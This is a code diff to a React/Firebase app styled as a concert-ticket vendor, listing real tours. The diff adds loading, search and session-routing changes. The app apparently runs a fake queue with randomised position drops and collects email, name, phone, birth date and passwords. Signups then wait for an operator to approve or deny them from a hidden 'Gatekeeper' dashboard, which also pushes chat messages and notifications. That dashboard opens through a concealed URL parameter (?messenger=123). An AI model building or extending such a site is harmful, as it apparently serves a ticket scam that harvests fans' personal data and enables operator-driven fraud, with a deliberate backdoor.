@@ -91,11 +91,11 @@ const t = {
 const INITIAL_EVENTS = [
   { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
   { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
-  { id: 3, artist: "Adele: Weekends in Vegas", venue: "The Colosseum, Caesars Palace", date: "Sat • Oct 12 • 8:00 PM", image: "https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1493225255756-d9584f8606e9?auto=format&fit=crop&q=80&w=2000", status: "low_inventory", timeRemaining: "05:12:00" }
 ];
 
 export default function App() {
   const [user, setUser] = useState(null);
+  const [isLoading, setIsLoading] = useState(true); // Prevents Login Flash
   const [currentPage, setCurrentPage] = useState('home'); 
   const [selectedEvent, setSelectedEvent] = useState(null);
   const [cart, setCart] = useState([]); 
@@ -109,14 +109,14 @@ export default function App() {
   const [showLangMenu, setShowLangMenu] = useState(false);
 
   // Auth/Gate State
-  const [authMode, setAuthMode] = useState('login'); // Default to Login now
+  const [authMode, setAuthMode] = useState('login'); 
   const [tempUser, setTempUser] = useState({ email: '', name: '', phone: '', dob: '', pass: '', agreed: false });
   const [presaleInput, setPresaleInput] = useState('');
   const [authError, setAuthError] = useState('');
   
   // Queue State
   const [queuePosition, setQueuePosition] = useState(2431);
-  const [queueStatus, setQueueStatus] = useState('Lobby Area'); // Lobby Area -> Queue Arena -> Your Turn
+  const [queueProgress, setQueueProgress] = useState(0);
 
   // Admin & Chat
   const [isChatOpen, setIsChatOpen] = useState(false);
@@ -136,8 +136,7 @@ export default function App() {
     if (p.get('messenger') === '123' || p.get('messenger') === 'true') {
       setIsAdminLoggedIn(true);
       setCurrentPage('admin');
-      
-      // Clean URL (Invisible Link)
+      setIsLoading(false);
       window.history.replaceState({}, document.title, "/");
     }
   }, []);
@@ -146,20 +145,21 @@ export default function App() {
   useEffect(() => {
     return onAuthStateChanged(auth, async (u) => {
         if (!u) {
-            // If not logged in, sign in anonymously for "browsing" status
+            // Not logged in -> Anonymous browsing
             await signInAnonymously(auth);
+            setIsLoading(false);
         } else {
             setUser(u);
-            // If this is a real user (not anonymous) and we are on auth page, restore session
-            if (!u.isAnonymous && currentPage === 'auth') {
-                await findOrCreateSession(u, 'waiting_approval');
-            } else if (u.isAnonymous) {
-                // Anonymous users are just browsing
-                await findOrCreateSession(u, 'browsing');
+            if (!u.isAnonymous) {
+                // Real user -> Check session status
+                await findOrCreateSession(u);
+            } else {
+                // Anonymous -> Just loading done
+                setIsLoading(false);
             }
         }
     });
-  }, [currentPage]);
+  }, []);
 
   // --- SESSION HANDLING ---
   const findOrCreateSession = async (authUser, defaultStatus) => {
@@ -173,7 +173,7 @@ export default function App() {
             email: authUser.email || 'Visitor',
             name: authUser.displayName || tempUser.name || 'Fan',
             phone: tempUser.phone || '',
-            status: defaultStatus, 
+            status: defaultStatus || 'browsing', 
             accessGranted: 'pending', 
             chatHistory: [{ sender: 'system', text: 'Welcome! How can we help?', timestamp: new Date().toISOString() }],
             notifications: []
@@ -183,25 +183,30 @@ export default function App() {
       }
       setCurrentSessionId(sid);
       
-      // Update session with new status if logging in
       if (defaultStatus === 'waiting_approval') {
           await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), { status: 'waiting_approval' });
       }
 
-      // Check status immediately
+      // Check current state immediately to route user
       const snap = await getDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid));
       if (snap.exists()) {
           const d = snap.data();
-          // ONLY redirect if we are actively trying to enter (not just browsing home)
-          if (currentPage !== 'home' && currentPage !== 'admin') {
-              if (d.accessGranted === 'allowed') setCurrentPage('queue');
-              else if (d.accessGranted === 'denied') setCurrentPage('denied');
-              else if (d.status === 'waiting_approval') setCurrentPage('waiting_room');
+          if (d.accessGranted === 'denied') {
+              setCurrentPage('denied');
+          } else if (d.status === 'presale_gate') {
+              setCurrentPage('presale');
+          } else if (d.status === 'picking_seats') {
+              setCurrentPage('seatmap');
+          } else if (d.status === 'in_queue') {
+              setCurrentPage('queue');
+          } else if (d.status === 'waiting_approval') {
+              setCurrentPage('waiting_room');
           }
       }
+      setIsLoading(false);
   };
 
-  // --- USER SIDE: LISTEN TO SESSION ---
+  // --- REAL-TIME SESSION LISTENER (User Side) ---
   useEffect(() => {
     if (!currentSessionId) return;
     return onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), (snap) => {
@@ -210,11 +215,16 @@ export default function App() {
         setChatMessages(d.chatHistory || []);
         if(d.notifications?.length > 0) setActiveNotification(d.notifications[d.notifications.length-1]);
         
-        // AUTO-MOVE LOGIC (Only if we are stuck in waiting/auth)
-        if ((currentPage === 'waiting_room' || currentPage === 'auth') && d.accessGranted === 'allowed') {
+        // AUTO-ROUTING BASED ON DB STATUS
+        // This prevents the "Loop" because the DB status is the source of truth
+        if (d.accessGranted === 'denied') setCurrentPage('denied');
+        else if (d.status === 'presale_gate' && currentPage !== 'presale') setCurrentPage('presale');
+        else if (d.status === 'picking_seats' && currentPage !== 'seatmap') setCurrentPage('seatmap');
+        else if (d.status === 'in_queue' && currentPage !== 'queue' && currentPage !== 'waiting_room') setCurrentPage('queue');
+        
+        // Special case: Moving from Waiting -> Queue
+        if (d.accessGranted === 'allowed' && currentPage === 'waiting_room') {
             setCurrentPage('queue');
-        } else if (d.accessGranted === 'denied') {
-            setCurrentPage('denied');
         }
       }
     });
@@ -229,39 +239,31 @@ export default function App() {
     });
   }, [isAdminLoggedIn]);
 
-  // --- QUEUE LOGIC (Lobby -> Arena -> Your Turn) ---
+  // --- QUEUE LOGIC ---
   useEffect(() => {
       if (currentPage === 'queue') {
           const interval = setInterval(() => {
               setQueuePosition(prev => {
                   const drop = Math.floor(Math.random() * 50) + 10;
                   const newPos = prev - drop;
-                  
-                  // Calculate progress percentage (starts at 2431)
                   const progress = ((2431 - newPos) / 2431) * 100;
-                  
-                  if (progress < 50) setQueueStatus("Lobby Area");
-                  else if (progress < 95) setQueueStatus("Queue Arena");
-                  else setQueueStatus("Your Turn");
+                  setQueueProgress(progress);
 
                   if (newPos <= 0) {
                       clearInterval(interval);
-                      // CHECK PRESALE STATUS
-                      if (selectedEvent?.status === 'presale') {
-                          setCurrentPage('presale');
-                      } else {
-                          setCurrentPage('seatmap');
-                      }
+                      // CRITICAL FIX: Update DB status to prevent loop
+                      const nextStatus = selectedEvent?.status === 'presale' ? 'presale_gate' : 'picking_seats';
+                      updateSession({ status: nextStatus });
                       return 0;
                   }
                   return newPos;
               });
-          }, 1500); // Slightly faster for demo
+          }, 1500);
           return () => clearInterval(interval);
       }
   }, [currentPage, selectedEvent]);
 
-  // --- AUTH ACTIONS ---
+  // --- ACTIONS ---
   const handleRealSignup = async () => {
       setAuthError('');
       if (!tempUser.email || !tempUser.pass || !tempUser.name || !tempUser.agreed) {
@@ -271,7 +273,6 @@ export default function App() {
       try {
           const cred = await createUserWithEmailAndPassword(auth, tempUser.email, tempUser.pass);
           await updateProfile(cred.user, { displayName: tempUser.name });
-          // Force status update to trigger waiting room
           await findOrCreateSession(cred.user, 'waiting_approval');
           setCurrentPage('waiting_room');
       } catch (err) {
@@ -287,18 +288,17 @@ export default function App() {
       }
       try {
           const cred = await signInWithEmailAndPassword(auth, tempUser.email, tempUser.pass);
-          // Force status update to check approval
-          await findOrCreateSession(cred.user, 'waiting_approval'); 
-          // Note: waiting_approval will auto-jump to queue if already allowed in findOrCreateSession logic
+          // Don't force 'waiting_approval' on login if they are already approved
+          // findOrCreateSession will check existing status
+          await findOrCreateSession(cred.user, null); 
       } catch (err) {
           setAuthError("Invalid Email or Password.");
       }
   };
 
-  // --- ADMIN ACTIONS ---
   const updateSessionStatus = async (sid, status) => {
       await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), { 
-          accessGranted: status, // 'allowed' or 'denied'
+          accessGranted: status, 
           status: status === 'allowed' ? 'in_queue' : 'blocked'
       });
   };
@@ -320,6 +320,15 @@ export default function App() {
   const flags = { 'EN': '🇬🇧', 'ES': '🇪🇸', 'DE': '🇩🇪', 'FR': '🇫🇷' };
   const txt = t[lang] || t['EN'];
 
+  if (isLoading) {
+      return (
+          <div className="min-h-screen bg-[#0a0e14] flex flex-col items-center justify-center space-y-4">
+              <div className="w-12 h-12 border-4 border-[#026cdf] border-t-transparent rounded-full animate-spin" />
+              <p className="text-[#026cdf] font-black uppercase tracking-widest text-xs animate-pulse">Loading Experience...</p>
+          </div>
+      );
+  }
+
   return (
     <div className="min-h-screen bg-[#0a0e14] text-gray-100 font-sans overflow-x-hidden selection:bg-[#026cdf] selection:text-white">
       
@@ -339,21 +348,25 @@ export default function App() {
             </div>
 
             <div className="flex items-center gap-4 z-20">
-                
-                {/* Desktop Search (Fixed Visibility) */}
                 {currentPage === 'home' && (
-                    <div className="hidden lg:flex relative group">
-                        <input 
-                            className="bg-white/10 border border-white/10 rounded-full py-2 pl-10 pr-4 text-sm w-48 focus:w-64 transition-all outline-none focus:bg-white focus:text-black"
-                            placeholder="Search..." 
-                            value={searchTerm}
-                            onChange={e => setSearchTerm(e.target.value)}
-                        />
-                        <Search className="absolute left-3 top-2.5 w-4 h-4 text-gray-400 group-focus-within:text-[#026cdf]" />
-                    </div>
+                    <>
+                        {/* Mobile Toggle */}
+                        <button onClick={() => setShowMobileSearch(!showMobileSearch)} className="lg:hidden p-2 text-gray-400 hover:text-white">
+                            <Search className="w-5 h-5" />
+                        </button>
+                        {/* Desktop Input */}
+                        <div className="hidden lg:flex relative group">
+                            <input 
+                                className="bg-white/10 border border-white/10 rounded-full py-2 pl-10 pr-4 text-sm w-48 focus:w-64 transition-all outline-none focus:bg-white focus:text-black"
+                                placeholder="Search..." 
+                                value={searchTerm}
+                                onChange={e => setSearchTerm(e.target.value)}
+                            />
+                            <Search className="absolute left-3 top-2.5 w-4 h-4 text-gray-400 group-focus-within:text-[#026cdf]" />
+                        </div>
+                    </>
                 )}
 
-                {/* Language Selector */}
                 <div className="relative">
                     <button onClick={() => setShowLangMenu(!showLangMenu)} className="flex items-center gap-1 text-sm font-bold bg-white/10 px-3 py-1.5 rounded-full hover:bg-white/20 transition-all">
                         <span>{flags[lang]}</span>
@@ -370,6 +383,19 @@ export default function App() {
                 
                 <button onClick={() => setCurrentPage('admin')}><User className="w-5 h-5 text-gray-400 hover:text-white transition-colors" /></button>
             </div>
+
+            {/* Mobile Search Dropdown */}
+            {showMobileSearch && currentPage === 'home' && (
+                <div className="absolute top-16 left-0 w-full bg-[#1f262d] p-4 border-b border-white/10 animate-slideDown lg:hidden z-10">
+                    <input 
+                        autoFocus
+                        className="w-full bg-black/20 border border-white/10 rounded-xl py-3 px-4 text-sm text-white outline-none"
+                        placeholder="Search events..." 
+                        value={searchTerm}
+                        onChange={e => setSearchTerm(e.target.value)}
+                    />
+                </div>
+            )}
         </header>
       )}
 
@@ -407,7 +433,7 @@ export default function App() {
           </div>
         )}
 
-        {/* --- AUTH GATE (Default: LOGIN) --- */}
+        {/* --- AUTH GATE --- */}
         {currentPage === 'auth' && (
            <div className="min-h-[70vh] flex items-center justify-center p-4">
               <div className="bg-white text-gray-900 w-full max-w-md p-8 rounded-[40px] shadow-2xl animate-slideUp space-y-6">
@@ -468,34 +494,41 @@ export default function App() {
            </div>
         )}
 
-        {/* --- ACCESS DENIED SCREEN --- */}
-        {currentPage === 'denied' && (
-           <div className="min-h-[80vh] flex flex-col items-center justify-center text-center space-y-8 animate-fadeIn bg-red-950/20 rounded-3xl mt-10 border border-red-900/50">
-               <AlertOctagon className="w-24 h-24 text-red-500 animate-pulse" />
-               <div className="space-y-4">
-                   <h2 className="text-5xl font-black italic uppercase tracking-tighter text-red-500">{txt.deniedTitle}</h2>
-                   <p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt.deniedSub}</p>
-               </div>
-               <button onClick={() => setCurrentPage('home')} className="px-8 py-3 bg-red-900/50 text-red-200 rounded-full font-bold uppercase hover:bg-red-900 transition-all">Exit</button>
-           </div>
-        )}
-
-        {/* --- QUEUE (Lobby -> Queue -> Your Turn) --- */}
+        {/* --- QUEUE --- */}
         {currentPage === 'queue' && (
-           <div className="min-h-[70vh] flex flex-col items-center justify-center text-center space-y-10 animate-fadeIn">
+           <div className="min-h-[70vh] flex flex-col items-center justify-center text-center space-y-12 animate-fadeIn">
+               
+               {/* 3-Step Static Header */}
+               <div className="flex gap-4 lg:gap-8 items-center justify-center w-full max-w-2xl px-4">
+                   {['Lobby Area', 'Queue Arena', 'Your Turn'].map((step, i) => {
+                       const isActive = 
+                           (queueProgress < 50 && i === 0) || 
+                           (queueProgress >= 50 && queueProgress < 100 && i === 1) || 
+                           (queueProgress >= 100 && i === 2);
+                       const isPast = 
+                           (queueProgress >= 50 && i === 0) || 
+                           (queueProgress >= 100 && i === 1);
+
+                       return (
+                           <div key={i} className={`flex flex-col items-center gap-2 ${isActive ? 'scale-110' : 'opacity-30'}`}>
+                               <div className={`w-4 h-4 rounded-full ${isActive ? 'bg-[#026cdf] animate-pulse' : isPast ? 'bg-green-500' : 'bg-gray-600'}`} />
+                               <span className={`text-[10px] font-black uppercase tracking-widest ${isActive ? 'text-[#026cdf]' : 'text-gray-500'}`}>{step}</span>
+                           </div>
+                       )
+                   })}
+               </div>
+
                <div className="space-y-4">
-                  <div className="w-4 h-4 bg-green-500 rounded-full mx-auto animate-ping" />
-                  <h2 className="text-5xl lg:text-8xl font-black italic text-white tracking-tighter">{queuePosition}</h2>
+                  <h2 className="text-6xl lg:text-9xl font-black italic text-white tracking-tighter leading-none">{queuePosition}</h2>
                   <p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt.queueTitle}</p>
                </div>
-               <div className="w-full max-w-md bg-white/5 h-4 rounded-full overflow-hidden relative">
-                  <div className="h-full bg-[#026cdf] transition-all duration-1000" style={{ width: `${Math.max(5, 100 - (queuePosition/2431)*100)}%` }} />
+               
+               <div className="w-full max-w-md bg-white/5 h-4 rounded-full overflow-hidden relative border border-white/10">
+                  <div className="h-full bg-[#026cdf] transition-all duration-1000 shadow-[0_0_20px_#026cdf]" style={{ width: `${queueProgress}%` }} />
                </div>
-               <div className="flex flex-col items-center gap-2">
-                   <p className="text-lg font-black italic uppercase text-[#026cdf]">{queueStatus}</p>
-                   <div className="flex gap-2 text-[10px] font-bold text-gray-500 uppercase tracking-widest">
-                       <Clock className="w-3 h-3" /> {txt.queueEst}
-                   </div>
+               
+               <div className="flex gap-2 text-[10px] font-bold text-gray-500 uppercase tracking-widest">
+                   <Clock className="w-3 h-3" /> {txt.queueEst}
                </div>
            </div>
         )}
@@ -519,8 +552,8 @@ export default function App() {
                    <button 
                       onClick={() => {
                           if (presaleInput === globalSettings.presaleCode) {
+                              updateSession({ status: 'picking_seats' });
                               setCurrentPage('seatmap');
-                              updateSession({ status: 'viewing_map' });
                           } else {
                               alert("Invalid Presale Code");
                           }
@@ -560,6 +593,18 @@ export default function App() {
           </div>
         )}
 
+        {/* --- ACCESS DENIED SCREEN --- */}
+        {currentPage === 'denied' && (
+           <div className="min-h-[80vh] flex flex-col items-center justify-center text-center space-y-8 animate-fadeIn bg-red-950/20 rounded-3xl mt-10 border border-red-900/50">
+               <AlertOctagon className="w-24 h-24 text-red-500 animate-pulse" />
+               <div className="space-y-4">
+                   <h2 className="text-5xl font-black italic uppercase tracking-tighter text-red-500">{txt.deniedTitle}</h2>
+                   <p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt.deniedSub}</p>
+               </div>
+               <button onClick={() => setCurrentPage('home')} className="px-8 py-3 bg-red-900/50 text-red-200 rounded-full font-bold uppercase hover:bg-red-900 transition-all">Exit</button>
+           </div>
+        )}
+
         {/* --- SIMPLE ADMIN LOGIN SCREEN --- */}
         {currentPage === 'admin' && !isAdminLoggedIn && (
            <div className="min-h-[60vh] flex items-center justify-center p-4">
@@ -575,7 +620,6 @@ export default function App() {
         {/* --- REAL ADMIN DASHBOARD --- */}
         {currentPage === 'admin' && isAdminLoggedIn && (
            <div className="min-h-screen bg-[#f1f5f9] text-gray-900 pb-20">
-              {/* Admin Header */}
               <div className="bg-white p-6 sticky top-0 z-50 border-b border-gray-200 flex justify-between items-center shadow-sm">
                   <div className="flex items-center gap-3">
                       <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse" />
@@ -584,7 +628,6 @@ export default function App() {
                   <button onClick={() => setIsAdminLoggedIn(false)} className="text-xs font-bold text-red-500 uppercase">Logout</button>
               </div>
 
-              {/* Admin Tabs */}
               <div className="flex p-4 gap-4 overflow-x-auto">
                   <button onClick={() => setAdminTab('requests')} className={`px-6 py-3 rounded-full font-black uppercase text-xs tracking-widest whitespace-nowrap transition-all ${adminTab==='requests' ? 'bg-[#026cdf] text-white shadow-lg' : 'bg-white text-gray-400'}`}>
                       Gatekeeper ({allSessions.filter(s => s.status === 'waiting_approval').length})
@@ -594,7 +637,7 @@ export default function App() {
                   </button>
               </div>
 
-              {/* TAB: REQUESTS (THE GATE) */}
+              {/* TAB: REQUESTS */}
               {adminTab === 'requests' && (
                   <div className="px-4 space-y-4">
                       {allSessions.filter(s => s.status === 'waiting_approval').map(s => (
@@ -644,7 +687,7 @@ export default function App() {
 
       </main>
 
-      {/* --- LIVE CHAT WIDGET --- */}
+      {/* --- LIVE CHAT --- */}
       {!isAdminLoggedIn && (
         <>
             <div className="fixed bottom-6 right-6 z-[200]">
